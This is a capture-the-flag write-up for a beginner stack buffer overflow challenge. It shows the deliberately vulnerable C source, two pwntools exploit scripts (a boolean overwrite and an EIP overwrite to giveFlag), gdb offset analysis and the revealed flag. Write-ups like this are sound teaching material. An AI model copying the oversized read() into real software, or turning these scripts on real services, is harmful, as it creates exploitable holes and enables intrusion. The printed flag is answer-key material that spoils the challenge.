Let's take a look at the source code...

```
//
//  stack0.c
//  PwnableHarness
//
//  Created by C0deH4cker on 11/15/13.
//  Copyright (c) 2013 C0deH4cker. All rights reserved.
//

#include <stdio.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include "pwnable_harness.h"


/* Filename of the first flag */
static const char* flagfile = "flag1.txt";

/* Send the user the contents of the first flag file. */
static void giveFlag(void) {
	char flag[64];
	FILE* fp = fopen(flagfile, "r");
	if(!fp) {
		perror(flagfile);
		return;
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	
	printf("Here is your first flag: %s\n", flag);
}

/* Called when an incoming client connection is received. */
static void handle_connection(int sock) {
	bool didPurchase = false;
	char input[50];
	
	printf("Debug info: Address of input buffer = %p\n", input);
	
	printf("Enter the name you used to purchase this program: ");
	read(STDIN_FILENO, input, 1024);
	
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
}

int main(int argc, char** argv) {
	/* Defaults: Run on port 32101 for 30 seconds as user "ctf_stack0" inside a chroot */
	server_options opts = {
		.user = "ctf_stack0",
		.chrooted = true,
		.port = 32101,
		.time_limit_seconds = 30
	};
	
	return server_main(argc, argv, opts, &handle_connection);
}
```
#Method1

Looking through this code, in the handle_connection section, I can see a vulnerabillity.

```
read(STDIN_FILENO, input, 1024);
```

The issue with this, is that it designated that it could write 1024 bytes to input (which is only 50 bytes). So essentially this will allow us to overflow the program.
This can be helpful later on, when we have this if then statement,

```
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
```

So in order to complete this challenge, we will need the program to evaluate itself as true so it will run the giveFlag() function. The issue with this is the if then statement evaluates a boolean that we don't have any direct input.
We can try using the overflow vulnerabillity eariler to see if that can change the value of that boolean, to true. Since input is only 50 bytes, I am going to try to overflow it with 50 characters.

And here is my python script to try it out.

```
#Import pwntools
from pwn import *

#Establish connection to server
conn = remote('ctf.hackucf.org', 32101)

#Create exploit
exploit = "0"*50 

#Read off first line of program
print conn.recvline()

#Send Exploit
print "Sending: " + exploit
conn.sendline(exploit)

#Finish reading rest of the output from the program
print conn.recvline()
print conn.recvline()
```

And let's try it out...

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/stack0_pt1$ sudo python exploit.py 
[sudo] password for guyinatuxedo: 
[+] Opening connection to ctf.hackucf.org on port 32101: Done
Debug info: Address of input buffer = 0xff8f2b7d

Enter the name you used to purchase this program: Thank you for purchasing Hackersoft Powersploit!

Here is your first flag: flag{babys_first_buffer_overflow}

[*] Closed connection to ctf.hackucf.org port 32101
```

And as you can see, we pwned the program.

#Method 2

This method is the one I originally used to pwn the challenge, because I just forgot how to do Method 1. Don't ask me how that happened. So essentially this method will involve hijacking the program execution flow, to execute the giveFlag() function. In order to do this, we will need to find the distance between where we first start giving input and the eip register which holds the next address which will be executed. In addition to that we will also need to find the address of the giveFlag() function.


```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/stack0_pt1$ gdb ./stack0 
gdb-peda$ disas handle_connection
Dump of assembler code for function handle_connection:
   0x0804871b <+0>:	push   ebp
   0x0804871c <+1>:	mov    ebp,esp
   0x0804871e <+3>:	sub    esp,0x48
   0x08048721 <+6>:	mov    BYTE PTR [ebp-0x9],0x0
   0x08048725 <+10>:	sub    esp,0x8
   0x08048728 <+13>:	lea    eax,[ebp-0x3b]
   0x0804872b <+16>:	push   eax
   0x0804872c <+17>:	push   0x804888c
   0x08048731 <+22>:	call   0x8048520 <printf@plt>
   0x08048736 <+27>:	add    esp,0x10
   0x08048739 <+30>:	sub    esp,0xc
   0x0804873c <+33>:	push   0x80488b8
   0x08048741 <+38>:	call   0x8048520 <printf@plt>
   0x08048746 <+43>:	add    esp,0x10
   0x08048749 <+46>:	sub    esp,0x4
   0x0804874c <+49>:	push   0x400
   0x08048751 <+54>:	lea    eax,[ebp-0x3b]
   0x08048754 <+57>:	push   eax
   0x08048755 <+58>:	push   0x0
   0x08048757 <+60>:	call   0x8048510 <read@plt>
   0x0804875c <+65>:	add    esp,0x10
   0x0804875f <+68>:	cmp    BYTE PTR [ebp-0x9],0x0
   0x08048763 <+72>:	je     0x804877c <handle_connection+97>
   0x08048765 <+74>:	sub    esp,0xc
   0x08048768 <+77>:	push   0x80488ec
   0x0804876d <+82>:	call   0x8048560 <puts@plt>
   0x08048772 <+87>:	add    esp,0x10
   0x08048775 <+90>:	call   0x80486ab <giveFlag>
   0x0804877a <+95>:	jmp    0x804878c <handle_connection+113>
   0x0804877c <+97>:	sub    esp,0xc
   0x0804877f <+100>:	push   0x8048920
   0x08048784 <+105>:	call   0x8048560 <puts@plt>
   0x08048789 <+110>:	add    esp,0x10
   0x0804878c <+113>:	nop
   0x0804878d <+114>:	leave  
   0x0804878e <+115>:	ret    
End of assembler dump.
gdb-peda$ b *handle_connection+68
Breakpoint 1 at 0x804875f
gdb-peda$ r
Starting program: /Hackery/ctf/ucf/pwn/stack0_pt1/stack0 
Debug info: Address of input buffer = 0xffffcead
Enter the name you used to purchase this program: 
Breakpoint 1, 0x0804875f in handle_connection ()
gdb-peda$ info frame
Stack level 0, frame at 0xffffcef0:
 eip = 0x804875f in handle_connection; saved eip = 0xf7fd033b
 called by frame at 0xffffcf90
 Arglist at 0xffffcee8, args: 
 Locals at 0xffffcee8, Previous frame's sp is 0xffffcef0
 Saved registers:
  ebp at 0xffffcee8, eip at 0xffffceec
```
Now let me explain what I did here. I started the program in gdb, then viewed the dissassembly for the handle_connection() function which holds the vulnerabillity. I set a breakpoint in the function (doesn't mattery too much where it is, as long as it isn't in the beginning or the end) then I ran the program, and then looked at the frame when I hit the breakpoint which gave me the eip register value.
Now that we know eip is at 0xffffceec, and we know that our input is stored at 0xffffcead (courtesy of the program telling us, to save us a bit of work) we can subtract the two values and find the difference.

```
0xffffceec - 0xffffcead = 63
```

So we now know that we need to write 63 characters to reach the eip register. Now we just need to know the address of the giveFlag function which gdb will tell us.

```
gdb-peda$ print giveFlag
$2 = {<text variable, no debug info>} 0x80486ab <giveFlag>
```
So we now have the address of the giveFlag function, which is "0x80486ab". Now we can just write a script to go ahead and overwrite the eip register with the giveFlag function, which will effictely make it so when the handle_connection() function is done executing it will run the giveFlag() function. Here is my script to do that.

```
#Import pwntools
from pwn import *

#Establish connection to the server
conn = remote('ctf.hackucf.org', 32101)

#Write out the explout to write the 63 characters, then the address in little Endian so the program can read it properly
exploit = "0"*63 + "\xab\x86\x04\x08"

#Recieve first line
print conn.recvline()

#Send the exploit
print "Sending: " + exploit
conn.sendline(exploit)

#Reveieve the rest of the program
print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()
```

Now let's try it...

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/stack0_pt1$ python exploit2.py 
[+] Opening connection to ctf.hackucf.org on port 32101: Done
Debug info: Address of input buffer = 0xffff86bd

Sending: 000000000000000000000000000000000000000000000000000000000000000\xab\x86\x0
Enter the name you used to purchase this program: Thank you for purchasing Hackersoft Powersploit!

Here is your first flag: flag{babys_first_buffer_overflow}



Here is your first flag: flag{babys_first_buffer_overflow}

[*] Closed connection to ctf.hackucf.org port 32101
```

As you can see, it worked. But it gave us the flag twice? This is because when we wrote 63 characters to it, we effictivly did the same thing as method 1 earlier in the writeup. So essentially doing it this way we got the flag from both having the if then statment evaluate as true, and then hijacking the code execution flow.

And just like that, we pwned the program twice.
